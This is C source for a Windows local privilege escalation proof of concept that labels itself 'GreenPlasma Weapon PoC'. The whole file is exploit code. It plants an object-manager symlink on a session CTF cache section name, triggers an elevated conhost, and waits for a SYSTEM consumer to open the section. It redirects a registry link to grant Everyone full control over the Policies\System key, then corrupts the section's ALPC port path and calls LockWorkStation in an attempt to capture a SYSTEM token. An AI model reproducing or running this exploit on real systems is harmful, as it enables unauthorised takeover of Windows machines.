
#include <Windows.h>
#include <winternl.h>
#include <aclapi.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

#ifndef SECTION_QUERY
#define SECTION_QUERY 0x0001
#endif

#ifndef SECTION_MAP_WRITE
#define SECTION_MAP_WRITE 0x0002
#endif

#ifndef SECTION_MAP_READ
#define SECTION_MAP_READ 0x0004
#endif

#ifndef SECTION_MAP_EXECUTE
#define SECTION_MAP_EXECUTE 0x0008
#endif

#ifndef SECTION_EXTEND_SIZE
#define SECTION_EXTEND_SIZE 0x0010
#endif

#ifndef SECTION_MAP_EXECUTE_EXPLICIT
#define SECTION_MAP_EXECUTE_EXPLICIT 0x0020
#endif

#ifndef GP_OPEN_TIMEOUT_MS
#define GP_OPEN_TIMEOUT_MS 30000
#endif

#ifndef GP_OPEN_POLL_MS
#define GP_OPEN_POLL_MS 20
#endif

#ifndef GP_OPEN_STATUS_LOG_MS
#define GP_OPEN_STATUS_LOG_MS 1000
#endif

#define GP_OBJECT_BASIC_INFORMATION_CLASS 0
#define GP_OBJECT_NAME_INFORMATION_CLASS 1
#define GP_OBJECT_TYPE_INFORMATION_CLASS 2

typedef NTSTATUS(WINAPI* PFN_NtCreateSymbolicLinkObject)(
    OUT PHANDLE pHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING DestinationName);

typedef NTSTATUS(WINAPI* PFN_NtOpenSection)(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS(WINAPI* PFN_NtDeleteKey)(HANDLE hkey);

typedef NTSTATUS(WINAPI* PFN_NtQueryObject)(
    HANDLE Handle,
    ULONG ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength);

typedef DWORD(WINAPI* PFN_CfAbortOperation)(DWORD pid, void* unknown, DWORD flags);

typedef struct _GP_OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG Reserved[10];
} GP_OBJECT_BASIC_INFORMATION, *PGP_OBJECT_BASIC_INFORMATION;

static PFN_NtCreateSymbolicLinkObject _NtCreateSymbolicLinkObject = NULL;
static PFN_NtOpenSection _NtOpenSection = NULL;
static PFN_NtDeleteKey _NtDeleteKey = NULL;
static PFN_NtQueryObject _NtQueryObject = NULL;
static PFN_CfAbortOperation CfAbortOperation = NULL;

static void PrintTimestamp(const wchar_t* phase)
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    wprintf(L"[%04u-%02u-%02u %02u:%02u:%02u.%03u] [%ls] ",
        st.wYear,
        st.wMonth,
        st.wDay,
        st.wHour,
        st.wMinute,
        st.wSecond,
        st.wMilliseconds,
        phase);
}

static void TraceLine(const wchar_t* phase, const wchar_t* message)
{
    PrintTimestamp(phase);
    wprintf(L"%ls\n", message);
}

static void TraceWin32(const wchar_t* phase, const wchar_t* label, DWORD code)
{
    PrintTimestamp(phase);
    wprintf(L"%ls: %lu (0x%08lx)\n", label, code, code);
}

static void TraceNtStatus(const wchar_t* phase, const wchar_t* label, NTSTATUS status)
{
    PrintTimestamp(phase);
    wprintf(L"%ls: 0x%08lx\n", label, (DWORD)status);
}

static bool ResolveNativeApis()
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        TraceWin32(L"P0", L"GetModuleHandleW(ntdll.dll)", GetLastError());
        return false;
    }

    _NtCreateSymbolicLinkObject =
        (PFN_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    _NtOpenSection = (PFN_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
    _NtDeleteKey = (PFN_NtDeleteKey)GetProcAddress(ntdll, "NtDeleteKey");
    _NtQueryObject = (PFN_NtQueryObject)GetProcAddress(ntdll, "NtQueryObject");

    HMODULE cldapi = LoadLibraryW(L"cldapi.dll");
    if (cldapi) {
        CfAbortOperation = (PFN_CfAbortOperation)GetProcAddress(cldapi, "CfAbortOperation");
    }

    if (!_NtCreateSymbolicLinkObject || !_NtOpenSection || !_NtDeleteKey || !_NtQueryObject) {
        TraceLine(L"P0", L"required native API resolution failed");
        return false;
    }

    if (!CfAbortOperation) {
        TraceLine(L"P0", L"CfAbortOperation unavailable; use NO_CF_ABORT to split this branch explicitly");
    }

    return true;
}

static DWORD CallCfAbortOperation(const wchar_t* phase)
{
#ifdef NO_CF_ABORT
    TraceLine(phase, L"NO_CF_ABORT set; CfAbortOperation skipped");
    return ERROR_SUCCESS;
#else
    if (!CfAbortOperation) {
        TraceLine(phase, L"CfAbortOperation unavailable");
        return ERROR_PROC_NOT_FOUND;
    }

    DWORD res = CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
    TraceWin32(phase, L"CfAbortOperation", res);
    return res;
#endif
}

static void PrintUnicodeInfo(const wchar_t* label, PUNICODE_STRING value)
{
    PrintTimestamp(L"SNAPSHOT");
    if (!value || !value->Buffer || !value->Length) {
        wprintf(L"%ls: <empty>\n", label);
        return;
    }

    wprintf(L"%ls: %.*ls\n", label, value->Length / sizeof(wchar_t), value->Buffer);
}

static void QueryObjectUnicode(HANDLE handle, ULONG infoClass, const wchar_t* label)
{
    ULONG length = 0x2000;
    ULONG returned = 0;
    PBYTE buffer = (PBYTE)malloc(length);
    if (!buffer) {
        TraceLine(L"SNAPSHOT", L"malloc failed for NtQueryObject unicode buffer");
        return;
    }

    NTSTATUS status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
    if ((status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL) && returned > length) {
        free(buffer);
        length = returned + sizeof(UNICODE_STRING);
        buffer = (PBYTE)malloc(length);
        if (!buffer) {
            TraceLine(L"SNAPSHOT", L"malloc retry failed for NtQueryObject unicode buffer");
            return;
        }
        status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
    }

    if (!NT_SUCCESS(status)) {
        TraceNtStatus(L"SNAPSHOT", label, status);
        free(buffer);
        return;
    }

    PrintUnicodeInfo(label, (PUNICODE_STRING)buffer);
    free(buffer);
}

static void PrintAccessFlag(ACCESS_MASK access, ACCESS_MASK flag, const wchar_t* name)
{
    if (access & flag) {
        PrintTimestamp(L"ACCESS");
        wprintf(L"%ls present\n", name);
    }
}

static void LogGrantedAccess(ACCESS_MASK access)
{
    PrintTimestamp(L"ACCESS");
    wprintf(L"GrantedAccess=0x%08lx\n", access);

    PrintAccessFlag(access, SECTION_QUERY, L"SECTION_QUERY");
    PrintAccessFlag(access, SECTION_MAP_READ, L"SECTION_MAP_READ");
    PrintAccessFlag(access, SECTION_MAP_WRITE, L"SECTION_MAP_WRITE");
    PrintAccessFlag(access, SECTION_MAP_EXECUTE, L"SECTION_MAP_EXECUTE");
    PrintAccessFlag(access, SECTION_EXTEND_SIZE, L"SECTION_EXTEND_SIZE");
    PrintAccessFlag(access, SECTION_MAP_EXECUTE_EXPLICIT, L"SECTION_MAP_EXECUTE_EXPLICIT");
    PrintAccessFlag(access, READ_CONTROL, L"READ_CONTROL");
    PrintAccessFlag(access, WRITE_DAC, L"WRITE_DAC");
    PrintAccessFlag(access, WRITE_OWNER, L"WRITE_OWNER");

    PrintTimestamp(L"ACCESS");
    wprintf(L"S candidate: ");
    if (access & SECTION_QUERY) {
        wprintf(L"existence/metadata/lifetime branch; ");
    }
    if (access & SECTION_MAP_READ) {
        wprintf(L"observation branch; ");
    }
    if (access & SECTION_MAP_WRITE) {
        wprintf(L"content branch candidate only; ");
    }
    if (access & (WRITE_DAC | WRITE_OWNER)) {
        wprintf(L"descriptor branch candidate; ");
    }
    if (!(access & (SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_WRITE | WRITE_DAC | WRITE_OWNER))) {
        wprintf(L"no obvious decoded influence branch; ");
    }
    wprintf(L"\n");
}

static void LogObjectBasic(HANDLE handle)
{
    GP_OBJECT_BASIC_INFORMATION basic = { 0 };
    ULONG returned = 0;
    NTSTATUS status = _NtQueryObject(
        handle,
        GP_OBJECT_BASIC_INFORMATION_CLASS,
        &basic,
        sizeof(basic),
        &returned);

    if (!NT_SUCCESS(status)) {
        TraceNtStatus(L"SNAPSHOT", L"ObjectBasicInformation", status);
        return;
    }

    PrintTimestamp(L"SNAPSHOT");
    wprintf(L"Attributes=0x%08lx HandleCount=%lu PointerCount=%lu\n",
        basic.Attributes,
        basic.HandleCount,
        basic.PointerCount);
    LogGrantedAccess(basic.GrantedAccess);
}

static void LogKernelObjectSecurity(HANDLE handle)
{
    PSECURITY_DESCRIPTOR sd = NULL;
    PSID owner = NULL;
    PSID group = NULL;
    PACL dacl = NULL;

    DWORD res = GetSecurityInfo(
        handle,
        SE_KERNEL_OBJECT,
        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
        &owner,
        &group,
        &dacl,
        NULL,
        &sd);

    if (res != ERROR_SUCCESS) {
        TraceWin32(L"SECURITY", L"GetSecurityInfo(SE_KERNEL_OBJECT)", res);
        return;
    }

    LPWSTR sddl = NULL;
    if (ConvertSecurityDescriptorToStringSecurityDescriptorW(
        sd,
        SDDL_REVISION_1,
        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
        &sddl,
        NULL)) {
        PrintTimestamp(L"SECURITY");
        wprintf(L"SDDL=%ls\n", sddl);
        LocalFree(sddl);
    }
    else {
        TraceWin32(L"SECURITY", L"ConvertSecurityDescriptorToStringSecurityDescriptorW", GetLastError());
    }

    if (sd) {
        LocalFree(sd);
    }
}

static void LogHandleSnapshot(const wchar_t* phase, const wchar_t* predicate, HANDLE handle)
{
    PrintTimestamp(phase);
    wprintf(L"%ls handle=0x%p\n", predicate, handle);

    if (!handle || handle == INVALID_HANDLE_VALUE) {
        TraceLine(phase, L"snapshot skipped because handle is invalid");
        return;
    }

    QueryObjectUnicode(handle, GP_OBJECT_TYPE_INFORMATION_CLASS, L"ObjectType");
    QueryObjectUnicode(handle, GP_OBJECT_NAME_INFORMATION_CLASS, L"ObjectName");
    LogObjectBasic(handle);
    LogKernelObjectSecurity(handle);
}

static void LogRegistryState(const wchar_t* phase)
{
    HKEY hk = NULL;
    wchar_t data[1024] = { 0 };
    DWORD type = 0;
    DWORD bytes = sizeof(data);
    DWORD res = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
        REG_OPTION_OPEN_LINK,
        KEY_QUERY_VALUE,
        &hk);

    if (res == ERROR_SUCCESS) {
        res = RegQueryValueExW(hk, L"SymbolicLinkValue", NULL, &type, (LPBYTE)data, &bytes);
        PrintTimestamp(phase);
        if (res == ERROR_SUCCESS) {
            wprintf(L"secondary-stage registry link SymbolicLinkValue type=%lu target=\"%ls\"\n", type, data);
        }
        else {
            wprintf(L"secondary-stage registry link query error=%lu\n", res);
        }
        RegCloseKey(hk);
    }
    else {
        PrintTimestamp(phase);
        wprintf(L"secondary-stage registry link open error=%lu\n", res);
    }

    DWORD value = 0;
    bytes = sizeof(value);
    res = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0,
        KEY_QUERY_VALUE,
        &hk);
    if (res == ERROR_SUCCESS) {
        res = RegQueryValueExW(hk, L"DisableLockWorkstation", NULL, &type, (LPBYTE)&value, &bytes);
        PrintTimestamp(phase);
        if (res == ERROR_SUCCESS) {
            wprintf(L"secondary-stage DisableLockWorkstation type=%lu value=%lu\n", type, value);
        }
        else {
            wprintf(L"secondary-stage DisableLockWorkstation query error=%lu\n", res);
        }
        RegCloseKey(hk);
    }
    else {
        PrintTimestamp(phase);
        wprintf(L"secondary-stage Policies\\System open error=%lu\n", res);
    }
}

static bool OpenSectionWithTimeout(POBJECT_ATTRIBUTES objattr, HANDLE* sectionHandle)
{
    DWORD start = GetTickCount();
    DWORD lastLog = start;
    NTSTATUS lastStatus = STATUS_UNSUCCESSFUL;

    *sectionHandle = NULL;
    while (true) {
        HANDLE candidate = NULL;
        NTSTATUS status = _NtOpenSection(&candidate, MAXIMUM_ALLOWED, objattr);
        if (NT_SUCCESS(status) && candidate) {
            *sectionHandle = candidate;
            TraceNtStatus(L"P3", L"NtOpenSection primary oracle success", status);
            return true;
        }

        lastStatus = status;
        DWORD now = GetTickCount();
        if (now - lastLog >= GP_OPEN_STATUS_LOG_MS) {
            TraceNtStatus(L"P3", L"NtOpenSection primary oracle polling status", lastStatus);
            lastLog = now;
        }

        if (now - start >= GP_OPEN_TIMEOUT_MS) {
            TraceNtStatus(L"P3", L"NtOpenSection primary oracle timeout last status", lastStatus);
            return false;
        }

        Sleep(GP_OPEN_POLL_MS);
    }
}

static void LogDesktopState(const wchar_t* phase)
{
    HDESK dsk = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS);
    PrintTimestamp(phase);
    if (!dsk || dsk == INVALID_HANDLE_VALUE) {
        wprintf(L"desktop state: OpenInputDesktop failed error=%lu\n", GetLastError());
        return;
    }

    wprintf(L"desktop state: OpenInputDesktop succeeded handle=0x%p\n", dsk);
    CloseDesktop(dsk);
}

static void DeleteRegistryLinkKey(HKEY hk)
{
    if (hk && _NtDeleteKey) {
        _NtDeleteKey(hk);
    }
}

bool SetPolicyVal()
{
    bool ret = true;
    DWORD val = 1;
    DWORD dwRes = ERROR_SUCCESS;
    HKEY hk = NULL;
    DWORD res = ERROR_SUCCESS;
    PACL pACL = NULL;
    EXPLICIT_ACCESSW ea;
    HANDLE htoken = NULL;
    DWORD dwSize = 0;
    wchar_t* stringSid = NULL;
    wchar_t linktarget[MAX_PATH] = { 0 };
    PTOKEN_USER pTokenUser = NULL;

    TraceLine(L"P4", L"post-oracle transition stage begins: SetPolicyVal");
    CallCfAbortOperation(L"P4");

    ZeroMemory(&ea, sizeof(ea));
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPWSTR)L"Everyone";

    dwRes = SetEntriesInAclW(1, &ea, NULL, &pACL);
    if (ERROR_SUCCESS != dwRes) {
        TraceWin32(L"P4", L"SetEntriesInAclW", dwRes);
        goto cleanup;
    }

    res = TreeSetNamedSecurityInfoW(
        (LPWSTR)L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles",
        SE_REGISTRY_KEY,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL,
        NULL,
        pACL,
        NULL,
        TREE_SEC_INFO_RESET_KEEP_EXPLICIT,
        NULL,
        ProgressInvokeNever,
        NULL);
    TraceWin32(L"P4", L"TreeSetNamedSecurityInfoW(CloudFiles)", res);
    if (res) {
        goto cleanup;
    }

#ifdef SKIP_REG_LINK
    TraceLine(L"P4", L"SKIP_REG_LINK set; secondary registry link skipped");
    goto after_registry_link;
#else
    res = RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps");
    TraceWin32(L"P4", L"RegDeleteTreeW(CloudFiles\\BlockedApps)", res);
    if (res && res != ERROR_FILE_NOT_FOUND) {
        goto cleanup;
    }

    res = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
        0,
        NULL,
        REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hk,
        NULL);
    TraceWin32(L"P4", L"RegCreateKeyExW(CloudFiles\\BlockedApps link)", res);
    if (res) {
        goto cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
        TraceWin32(L"P4", L"OpenProcessToken", GetLastError());
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    GetTokenInformation(htoken, TokenUser, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        TraceWin32(L"P4", L"GetTokenInformation(size)", GetLastError());
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    pTokenUser = (PTOKEN_USER)malloc(dwSize);
    if (!pTokenUser) {
        TraceLine(L"P4", L"malloc(TokenUser) failed");
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    if (!GetTokenInformation(htoken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        TraceWin32(L"P4", L"GetTokenInformation(TokenUser)", GetLastError());
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }
    CloseHandle(htoken);
    htoken = NULL;

    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &stringSid)) {
        TraceWin32(L"P4", L"ConvertSidToStringSidW", GetLastError());
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    swprintf_s(
        linktarget,
        L"\\REGISTRY\\USER\\%ls\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        stringSid);

    res = RegSetValueExW(
        hk,
        L"SymbolicLinkValue",
        0,
        REG_LINK,
        (BYTE*)linktarget,
        (DWORD)((wcslen(linktarget) + 1) * sizeof(wchar_t)));
    TraceWin32(L"P4", L"RegSetValueExW(SymbolicLinkValue)", res);
    if (res) {
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    CallCfAbortOperation(L"P4");
#endif

after_registry_link:
    res = TreeSetNamedSecurityInfoW(
        (LPWSTR)L"CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        SE_REGISTRY_KEY,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL,
        NULL,
        pACL,
        NULL,
        TREE_SEC_INFO_RESET_KEEP_EXPLICIT,
        NULL,
        ProgressInvokeNever,
        NULL);
    TraceWin32(L"P4", L"TreeSetNamedSecurityInfoW(Policies\\System)", res);
    if (res) {
        goto cleanup;
    }

    if (hk) {
        DeleteRegistryLinkKey(hk);
        RegCloseKey(hk);
        hk = NULL;
    }

    res = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0,
        KEY_SET_VALUE,
        &hk);
    TraceWin32(L"P4", L"RegOpenKeyExW(Policies\\System)", res);
    if (res) {
        goto cleanup;
    }

    res = RegSetValueExW(hk, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
    TraceWin32(L"P4", L"RegSetValueExW(DisableLockWorkstation)", res);
    if (res) {
        goto cleanup;
    }

exit:
    if (pACL) {
        LocalFree(pACL);
    }
    if (stringSid) {
        LocalFree(stringSid);
    }
    if (pTokenUser) {
        free(pTokenUser);
    }
    if (htoken) {
        CloseHandle(htoken);
    }
    if (hk) {
        RegCloseKey(hk);
    }
    LogRegistryState(L"P4");
    TraceLine(L"P4", ret ? L"post-oracle transition stage ends: success" : L"post-oracle transition stage ends: failure");
    return ret;

cleanup:
    ret = false;
    goto exit;
}

int wmain(int argc, wchar_t** argv)
{
    wchar_t smpath[MAX_PATH] = { 0 };
    DWORD sesid = 0;
    SHELLEXECUTEINFO shi = { 0 };
    UNICODE_STRING linksrc = { 0 };
    UNICODE_STRING linktarget = { 0 };
    OBJECT_ATTRIBUTES objattr = { 0 };
    HANDLE hlnk = NULL;
    HANDLE hmapping = NULL;
    bool lockblock = false;

    if (!ResolveNativeApis()) {
        return 1;
    }

    TraceLine(L"P0", L"GreenPlasma Weapon PoC: Logical Corruption Execution Stage");

    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sesid)) {
        TraceWin32(L"P0", L"ProcessIdToSessionId", GetLastError());
        return 1;
    }

    // [P0] Strict source-name dependency
    swprintf_s(
        smpath, 
        L"\\Sessions\\%lu\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%lu", 
        sesid, 
        sesid
    );

    wchar_t localTarget[MAX_PATH];
    swprintf_s(localTarget, L"\\Sessions\\%lu\\BaseNamedObjects\\GreenPlasmaWeaponSection", sesid);
    wchar_t* ptarget = argc == 2 ? argv[1] : localTarget;

    PrintTimestamp(L"P0");
    wprintf(L"pid=%lu tid=%lu session=%lu\n", GetCurrentProcessId(), GetCurrentThreadId(), sesid);
    PrintTimestamp(L"P0");
    wprintf(L"Source(Strict)=\"%ls\"\n", smpath);
    PrintTimestamp(L"P0");
    wprintf(L"Target(Weaponized)=\"%ls\"\n", ptarget);

    RtlInitUnicodeString(&linksrc, smpath);
    RtlInitUnicodeString(&linktarget, ptarget);
    InitializeObjectAttributes(&objattr, &linksrc, OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    // [P1] Symbolic link creation (P_create)
    NTSTATUS stat = _NtCreateSymbolicLinkObject(&hlnk, GENERIC_ALL, &objattr, &linktarget);
    if (!NT_SUCCESS(stat)) {
        TraceNtStatus(L"P1", L"Failed to establish symlink primitive", stat);
        goto cleanup;
    }
    TraceLine(L"P1", L"Symlink trap successfully armed.");

#ifdef CLOSE_LINK_EARLY
    TraceLine(L"P1", L"CLOSE_LINK_EARLY: Closing link handle");
    CloseHandle(hlnk);
    hlnk = NULL;
#endif

#ifdef STOP_AFTER_LINK
    goto cleanup;
#endif

    // [P2] Privileged trigger
    shi.cbSize = sizeof(shi);
    shi.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
    shi.lpVerb = L"runas";
    shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";

    TraceLine(L"P2", L"Emitting high-privilege trigger (runas/conhost)");
    if (!ShellExecuteExW(&shi)) {
        TraceWin32(L"P2", L"Trigger failed", GetLastError());
        goto cleanup;
    }
    LogDesktopState(L"P2");

#ifdef STOP_AFTER_TRIGGER
    goto cleanup;
#endif

    // [P3] NtOpenSection oracle
    TraceLine(L"P3", L"Waiting for SYSTEM consumer to engage the trap...");
    if (!OpenSectionWithTimeout(&objattr, &hmapping)) {
        TraceLine(L"P3", L"Oracle Timeout: Engagement failed.");
        goto cleanup;
    }
    LogHandleSnapshot(L"P3", L"Consumer Handle Captured", hmapping);

#ifdef CLOSE_SECTION_EARLY
    CloseHandle(hmapping);
    hmapping = NULL;
#endif

#ifdef STOP_AFTER_OPEN
    goto cleanup;
#endif

#ifdef SKIP_SETPOLICY
    TraceLine(L"P4", L"SKIP_SETPOLICY set");
#else
    lockblock = SetPolicyVal();
    if (hmapping) {
        LogHandleSnapshot(L"P4", L"Post-Policy Snapshot", hmapping);
    }
#endif

#ifdef SKIP_LOCK
    TraceLine(L"P5", L"SKIP_LOCK set; lock/desktop transition window skipped");
#else
    if (lockblock) {
        // [P5] Weaponization and ALPC spoofing (logical takeover)
        TraceLine(L"P5", L"Monitoring for Desktop-Switch Window (The Race)");
        do {
            HDESK dsk = OpenInputDesktop(0, FALSE, GENERIC_ALL);
            if (!dsk || dsk == INVALID_HANDLE_VALUE) {
                TraceWin32(L"P5", L"Exploit Window Open: Desktop switch detected", GetLastError());
                break;
            }
            CloseDesktop(dsk);
            YieldProcessor(); 
        } while (1);

        if (hmapping) {
            TraceLine(L"P5", L"Mapping section to apply Logical Corruption (ALPC Spoofing)...");
            
            PVOID pView = MapViewOfFile(hmapping, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0);
            if (pView) {
                #pragma pack(push, 1)
                typedef struct _CTF_CACHE_LAYOUT {
                    ULONG Version;
                    ULONG Flags;
                    ULONG OffsetToData;
                    wchar_t AlpcServerPort[MAX_PATH]; 
                } CTF_CACHE_LAYOUT, *PCTF_CACHE_LAYOUT;
                #pragma pack(pop)

                PCTF_CACHE_LAYOUT pLayout = (PCTF_CACHE_LAYOUT)pView;

                /*
                 * [Exploit Core]
                 * Mutate only path-like state instead of placing executable code.
                 * The intended conversion path would rely on a privileged transition
                 * consuming this state and connecting to an attacker-controlled ALPC port.
                 */
                
                // Force the cache-update state bits.
                pLayout->Version = 1;
                pLayout->Flags |= 0x00000001; 
                
                // Spoof the target ALPC port path.
                wcscpy_s(pLayout->AlpcServerPort, MAX_PATH, L"\\RPC Control\\GreenPlasmaSpoofedPort");

                TraceLine(L"P5", L"CRITICAL: Structural corruption applied.");
                TraceLine(L"P5", L"-> SYSTEM will attempt ALPC connection to spoofed port.");
                
                UnmapViewOfFile(pView);
            } else {
                TraceWin32(L"P5", L"MapViewOfFile failed - Insufficient Access", GetLastError());
            }
        }

        // [Final trigger: P_consume]
        TraceLine(L"P5", L"Calling LockWorkStation to force P_consume of corrupted layout");
        if (!LockWorkStation()) {
            TraceWin32(L"P5", L"LockWorkStation failed", GetLastError());
        } else {
            TraceLine(L"P5", L"LockWorkStation triggered.");
            TraceLine(L"P5", L"[!] Exploit Armed. SYSTEM token capture pending at fake ALPC port.");
        }
    }
#endif

    if (hmapping) {
        LogHandleSnapshot(L"P6", L"O/A cleanup-lifetime snapshot", hmapping);
    }

    PrintTimestamp(L"P6");
    wprintf(L"Section handle: 0x%p\n", hmapping);
    TraceLine(L"P6", L"press any key to close section and exit");

cleanup:
    if (hlnk) {
        TraceLine(L"P6", L"closing link handle");
        CloseHandle(hlnk);
        hlnk = NULL;
    }

    if (hmapping) {
        _getch();
        TraceLine(L"P6", L"closing section handle");
        CloseHandle(hmapping);
        hmapping = NULL;
    }

    if (lockblock) {
        DWORD res = RegDeleteTreeW(
            HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        TraceWin32(L"P6", L"RegDeleteTreeW(Policies\\System cleanup)", res);
    }

    TraceLine(L"P6", L"exit");
    return 0;
}
